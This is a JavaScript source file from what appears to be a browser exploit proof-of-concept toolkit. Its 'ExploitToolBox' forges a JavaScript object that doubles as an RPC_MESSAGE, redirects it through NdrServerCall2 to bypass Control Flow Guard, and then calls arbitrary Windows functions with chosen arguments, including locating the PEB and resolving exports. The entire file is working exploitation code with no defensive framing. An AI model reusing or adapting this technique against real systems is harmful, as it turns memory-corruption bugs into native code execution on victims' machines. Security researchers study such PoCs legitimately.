	var rpc_dispatch = exp.allocate(0x20);
	exp.write_ptr(rpc_interface.add(0x30), rpc_dispatch);   // ->DispatchTable (there are two different ones...)
	exp.write_ptr(rpc_dispatch.add(0), 1);                  // DispatchTableCount
	
	// Function table for ndr
	var ndr_dispatch = exp.allocate(0x10);
	exp.write_ptr(rpc_dispatch.add(8), ndr_dispatch);       // ->->DispatchTable (they love this field name)
	exp.write_ptr(ndr_dispatch.add(0), ndrservercall);
	
	return addr;
}

// Set the target function
function set_target_function(exp, fake_object, function_ptr) {
	// RPC_MESSAGE -> RpcInterfaceInformation -> InterpreterInfo -> DispatchTable
	var rpc_interface = exp.read_ptr(fake_object.add(0x28));
	var midl_server_info = exp.read_ptr(rpc_interface.add(0x50));
	var function_table = exp.read_ptr(midl_server_info.add(8));
	exp.write_ptr(function_table.add(0), function_ptr);     // Target
}

var global_message = null;

// Change part of the RPC_MESSAGE that holds the arguments
// Currently support up to 12 arguments
function set_arguments(exp, fake_object, args) {
	var new_args = new Array();
	for (var i = 0, z = 0; i < args.length; i++) {
		if (args[i] instanceof Array && args[i].length > 8) {
			log(">> " + args[i].length);
			for (var x = 0; x < args[i].length; x += 8)
				new_args[z++] = args[i].slice(x, x + 8);
			continue;
		}
		new_args[z++] = args[i];
	}
	args = new_args;
	
	if (rpc_arg_count < args.length) {
		for (var i = 0; i < args.length; i++)
			log(new_args[i]);
		throw new Error(0, "Too many argument in set_arguments " + rpc_arg_count + " vs " + args.length);
	}

	var message_size = rpc_arg_count * 8;
	if (global_message == null) {
		global_message = exp.allocate(message_size);
	}
	var message = global_message;
	for (var i = 0; i < rpc_arg_count; i++) {
		var val = 0;
		if (args.length > i)
			val = args[i];
		exp.write_ptr(message.add(i * 8), val);
	}
	
	exp.write_ptr(fake_object.add(0x10), message);       // Buffer
	exp.write_uint(fake_object.add(0x18), message_size); // BufferLength
}

// The RPC message holds the return data
function get_return_value(exp, fake_object) {
	exp.cache_flush(); // Else we might read the cache
	var message_size = exp.read_uint(fake_object.add(0x18));
	var message_ptr = exp.read_ptr(fake_object.add(0x10));
	var r = exp.read(message_ptr, message_size.toInt());
	return new AInt(r);
}

// Prototype (va_args type): <function_ptr> <arguments>
ExploitToolBox.prototype.call_function_ex = function(function_ptr, args) {
	// Create a fake Javascript object that is also an RPC_MESSAGE
	if (this.fake_object == undefined) {
		var fake_object = create_fake_object(this);
		if (fake_object == null) {
			log("fake_object failed");
			throw new Error(0, "call_function failed");
		}
		this.fake_object = fake_object;
	}
	set_target_function(this, this.fake_object, function_ptr);
	set_arguments(this, this.fake_object, args);

	// Call NdrServerCall2 with the RPC_MESSAGE to call any CFG allowed function
	this.call_fake_object(this.fake_object);
	
	// Get the return value from the RPC_MESSAGE
	return get_return_value(this, this.fake_object);
}

// Prototype (va_args type): <module> <function_name> <args...>
ExploitToolBox.prototype.call_function = function() {
	var module = arguments[0];
	var function_name = arguments[1];
	var args = Array.prototype.slice.call(arguments).slice(2, arguments.length);
	
	var function_ptr = this.GetProcAddressFromPEB(module, function_name);
	return this.call_function_ex(function_ptr, args);
}

// Prototype (va_args type): <object> <entry index> <args...>
ExploitToolBox.prototype.call_function_cpp = function() {
	var object = arguments[0];
	var entry = arguments[1];
	var vtable = this.read_ptr(object);
	var args = [object]; // First argument is always the object
	args = args.concat(Array.prototype.slice.call(arguments).slice(2, arguments.length));
	return this.call_function_ex(this.read_ptr(vtable.add(entry * 8)), args);
}

// Call RtlGetCurrentPeb to get the current peb
function get_peb(exp) {
	// Trick specific to our implementation of GetProcAddress without a peb
	var points_to_ntdll = "api-ms-win-core-heap-l1-1-0.dll";
	var RtlGetCurrentPeb = exp.GetProcAddress(points_to_ntdll, "RtlGetCurrentPeb");
	if (RtlGetCurrentPeb == null) {
		exp.cleanup();
		throw new Error(0, "Could not find RtlGetCurrentPeb");
	}
	return exp.call_function_ex(RtlGetCurrentPeb, []);
}

// To call before using the api, especially logs
function initApi(dbglog = false) {
	if (initialized)
		return;
	if (debuglogs == false)
		debuglogs = dbglog;
	logArea = document.getElementById('log');
	initialized = true;
}

// Common start between PoCs
function exploit_start(anchor) {
	initApi();
	logseperate();
	log("Starting PoC '" + anchor + "' at " + (new Date()));
	var exp = new ExploitToolBox();
	exp.peb = get_peb(exp);
	return exp;
}